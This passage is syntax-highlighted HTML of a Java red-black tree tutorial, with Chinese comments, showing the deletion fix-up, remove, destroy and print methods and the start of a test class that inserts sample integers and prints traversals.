node<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">RBTNode</span><span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>BLACK<span class="token punctuation">,</span>null<span class="token punctuation">,</span>null<span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 如果新建结点失败，则返回。</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node <span class="token operator">!=</span> null<span class="token punctuation">)</span>            <span class="token function">insert</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*     * 红黑树删除修正函数     *     * 在从红黑树中删除插入节点之后(红黑树失去平衡)，再调用该函数；     * 目的是将它重新塑造成一颗红黑树。     *     * 参数说明：     *     node 待修正的节点     */</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">removeFixUp</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">,</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> parent<span class="token punctuation">)</span> <span class="token punctuation">{</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> other<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>node<span class="token operator">==</span>null <span class="token operator">||</span> <span class="token function">isBlack</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>node <span class="token operator">!=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>parent<span class="token punctuation">.</span>left <span class="token operator">==</span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>                other <span class="token operator">=</span> parent<span class="token punctuation">.</span>right<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isRed</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// Case 1: x的兄弟w是红色的  </span>                    <span class="token function">setBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">setRed</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">leftRotate</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                    other <span class="token operator">=</span> parent<span class="token punctuation">.</span>right<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token operator">==</span>null <span class="token operator">||</span> <span class="token function">isBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                    <span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token operator">==</span>null <span class="token operator">||</span> <span class="token function">isBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// Case 2: x的兄弟w是黑色，且w的俩个孩子也都是黑色的  </span>                    <span class="token function">setRed</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                    node <span class="token operator">=</span> parent<span class="token punctuation">;</span>                    parent <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token operator">==</span>null <span class="token operator">||</span> <span class="token function">isBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment" spellcheck="true">// Case 3: x的兄弟w是黑色的，并且w的左孩子是红色，右孩子为黑色。  </span>                        <span class="token function">setBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">setRed</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">rightRotate</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                        other <span class="token operator">=</span> parent<span class="token punctuation">.</span>right<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">// Case 4: x的兄弟w是黑色的；并且w的右孩子是红色的，左孩子任意颜色。</span>                    <span class="token function">setColor</span><span class="token punctuation">(</span>other<span class="token punctuation">,</span> <span class="token function">colorOf</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">setBlack</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">setBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">leftRotate</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                    node <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                other <span class="token operator">=</span> parent<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isRed</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// Case 1: x的兄弟w是红色的  </span>                    <span class="token function">setBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">setRed</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">rightRotate</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                    other <span class="token operator">=</span> parent<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token operator">==</span>null <span class="token operator">||</span> <span class="token function">isBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                    <span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token operator">==</span>null <span class="token operator">||</span> <span class="token function">isBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// Case 2: x的兄弟w是黑色，且w的俩个孩子也都是黑色的  </span>                    <span class="token function">setRed</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                    node <span class="token operator">=</span> parent<span class="token punctuation">;</span>                    parent <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token operator">==</span>null <span class="token operator">||</span> <span class="token function">isBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment" spellcheck="true">// Case 3: x的兄弟w是黑色的，并且w的左孩子是红色，右孩子为黑色。  </span>                        <span class="token function">setBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">setRed</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">leftRotate</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>                        other <span class="token operator">=</span> parent<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">// Case 4: x的兄弟w是黑色的；并且w的右孩子是红色的，左孩子任意颜色。</span>                    <span class="token function">setColor</span><span class="token punctuation">(</span>other<span class="token punctuation">,</span> <span class="token function">colorOf</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">setBlack</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">setBlack</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">rightRotate</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                    node <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token operator">!=</span>null<span class="token punctuation">)</span>            <span class="token function">setBlack</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*      * 删除结点(node)，并返回被删除的结点     *     * 参数说明：     *     node 删除的结点     */</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">remove</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> child<span class="token punctuation">,</span> parent<span class="token punctuation">;</span>        <span class="token keyword">boolean</span> color<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 被删除节点的"左右孩子都不为空"的情况。</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 被删节点的后继节点。(称为"取代节点")</span>            <span class="token comment" spellcheck="true">// 用它来取代"被删节点"的位置，然后再将"被删节点"去掉。</span>            RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> replace <span class="token operator">=</span> node<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 获取后继节点</span>            replace <span class="token operator">=</span> replace<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>replace<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span>                replace <span class="token operator">=</span> replace<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// "node节点"不是根节点(只有根节点不存在父节点)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">.</span>left <span class="token operator">==</span> node<span class="token punctuation">)</span>                    <span class="token function">parentOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">.</span>left <span class="token operator">=</span> replace<span class="token punctuation">;</span>                <span class="token keyword">else</span>                    <span class="token function">parentOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">.</span>right <span class="token operator">=</span> replace<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// "node节点"是根节点，更新根节点。</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot <span class="token operator">=</span> replace<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// child是"取代节点"的右孩子，也是需要"调整的节点"。</span>            <span class="token comment" spellcheck="true">// "取代节点"肯定不存在左孩子！因为它是一个后继节点。</span>            child <span class="token operator">=</span> replace<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            parent <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span>replace<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 保存"取代节点"的颜色</span>            color <span class="token operator">=</span> <span class="token function">colorOf</span><span class="token punctuation">(</span>replace<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// "被删除节点"是"它的后继节点的父节点"</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">==</span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>                parent <span class="token operator">=</span> replace<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// child不为空</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>child<span class="token operator">!=</span>null<span class="token punctuation">)</span>                    <span class="token function">setParent</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                parent<span class="token punctuation">.</span>left <span class="token operator">=</span> child<span class="token punctuation">;</span>                replace<span class="token punctuation">.</span>right <span class="token operator">=</span> node<span class="token punctuation">.</span>right<span class="token punctuation">;</span>                <span class="token function">setParent</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token punctuation">,</span> replace<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            replace<span class="token punctuation">.</span>parent <span class="token operator">=</span> node<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>            replace<span class="token punctuation">.</span>color <span class="token operator">=</span> node<span class="token punctuation">.</span>color<span class="token punctuation">;</span>            replace<span class="token punctuation">.</span>left <span class="token operator">=</span> node<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            node<span class="token punctuation">.</span>left<span class="token punctuation">.</span>parent <span class="token operator">=</span> replace<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>color <span class="token operator">==</span> BLACK<span class="token punctuation">)</span>                <span class="token function">removeFixUp</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>            node <span class="token operator">=</span> null<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>left <span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            child <span class="token operator">=</span> node<span class="token punctuation">.</span>left<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            child <span class="token operator">=</span> node<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        parent <span class="token operator">=</span> node<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 保存"取代节点"的颜色</span>        color <span class="token operator">=</span> node<span class="token punctuation">.</span>color<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>child<span class="token operator">!=</span>null<span class="token punctuation">)</span>            child<span class="token punctuation">.</span>parent <span class="token operator">=</span> parent<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// "node节点"不是根节点</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>parent<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>parent<span class="token punctuation">.</span>left <span class="token operator">==</span> node<span class="token punctuation">)</span>                parent<span class="token punctuation">.</span>left <span class="token operator">=</span> child<span class="token punctuation">;</span>            <span class="token keyword">else</span>                parent<span class="token punctuation">.</span>right <span class="token operator">=</span> child<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot <span class="token operator">=</span> child<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>color <span class="token operator">==</span> BLACK<span class="token punctuation">)</span>            <span class="token function">removeFixUp</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>        node <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*      * 删除结点(z)，并返回被删除的结点     *     * 参数说明：     *     tree 红黑树的根结点     *     z 删除的结点     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">remove</span><span class="token punctuation">(</span>T key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>node <span class="token operator">=</span> <span class="token function">search</span><span class="token punctuation">(</span>mRoot<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span>            <span class="token function">remove</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*     * 销毁红黑树     */</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> tree<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token operator">==</span>null<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span>            <span class="token function">destroy</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span>            <span class="token function">destroy</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>        tree<span class="token operator">=</span>null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">destroy</span><span class="token punctuation">(</span>mRoot<span class="token punctuation">)</span><span class="token punctuation">;</span>        mRoot <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*     * 打印"红黑树"     *     * key        -- 节点的键值      * direction  --  0，表示该节点是根节点;     *               -1，表示该节点是它的父结点的左孩子;     *                1，表示该节点是它的父结点的右孩子。     */</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> tree<span class="token punctuation">,</span> T key<span class="token punctuation">,</span> <span class="token keyword">int</span> direction<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>tree <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>direction<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// tree是根节点</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%2d(B) is root\n"</span><span class="token punctuation">,</span> tree<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                <span class="token comment" spellcheck="true">// tree是分支节点</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%2d(%s) is %2d's %6s child\n"</span><span class="token punctuation">,</span> tree<span class="token punctuation">.</span>key<span class="token punctuation">,</span> <span class="token function">isRed</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token operator">?</span><span class="token string">"R"</span><span class="token operator">:</span><span class="token string">"B"</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> direction<span class="token operator">==</span><span class="token number">1</span><span class="token operator">?</span><span class="token string">"right"</span> <span class="token operator">:</span> <span class="token string">"left"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">print</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>left<span class="token punctuation">,</span> tree<span class="token punctuation">.</span>key<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">print</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>right<span class="token punctuation">,</span>tree<span class="token punctuation">.</span>key<span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mRoot <span class="token operator">!=</span> null<span class="token punctuation">)</span>            <span class="token function">print</span><span class="token punctuation">(</span>mRoot<span class="token punctuation">,</span> mRoot<span class="token punctuation">.</span>key<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>红黑树的测试文件(RBTreeTest.java)</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * Java 语言: 二叉查找树 * * @author skywang * @date 2013/11/07 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RBTreeTest</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> mDebugInsert <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// "插入"动作的检测开关(false，关闭；true，打开)</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> mDebugDelete <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// "删除"动作的检测开关(false，关闭；true，打开)</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> ilen <span class="token operator">=</span> a<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        RBTree<span class="token operator">&lt;</span>Integer<span class="token operator">></span> tree<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">RBTree</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"== 原始数据: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>ilen<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>ilen<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            tree<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 设置mDebugInsert=true,测试"添加函数"</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>mDebugInsert<span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"== 添加节点: %d\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"== 树的详细信息: \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                tree<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"== 前序遍历: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tree<span class="token punctuation">.</span><span class="token function">preOrder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n== 中序遍历: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tree<span class="token punctuation">.</span><span class="token function">inOrder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n== 后序遍历: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tree<span class="token punctuation">.</span><span class="token function">postOrder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"== 最小值: %s\n"</span><span class="token punctuation">,</span> tree<span class="token punctuation">.</span><span class="token function">minimum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"== 最大值: %s\n"</span><span class="token punctuation">,</span> tree<span class="token punctuation">.</span><span class="token function">maximum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"== 树的详细信息: \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tree<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span 